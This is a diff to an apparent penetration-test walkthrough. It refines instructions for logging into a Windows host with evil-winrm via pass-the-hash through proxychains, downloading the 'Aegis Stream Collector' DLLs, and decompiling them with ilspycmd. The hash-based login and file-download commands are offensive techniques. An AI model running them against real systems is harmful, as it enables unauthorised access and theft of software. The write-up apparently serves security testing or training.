@@ -971,7 +971,7 @@ proxychains4 -q evil-winrm \
   -H "$DEPLOY_NT_HASH"
 ```
 
-The following are Evil-WinRM client commands, not standalone shell commands:
+The following are Evil-WinRM client commands, not standalone PowerShell commands. Enter each `download` command separately at the interactive prompt; pasting the entire block as one multiline submission sends the lines to PowerShell, where `download` is not recognized.
 
 ```text
 Set-Location C:\Users\svc-aegis-deploy\Documents
@@ -986,6 +986,9 @@ download 'C:\Program Files\Aegis Stream Collector\YamlDotNet.dll' 'artifacts/aeg
 Decompile the downloaded assemblies locally:
 
 ```bash
+export PATH="$PATH:/root/.dotnet/tools"
+command -v ilspycmd
+
 ilspycmd -p -o /tmp/odyssey-ilspy/common \
   artifacts/aegisstream/AegisStream.Common.dll
 
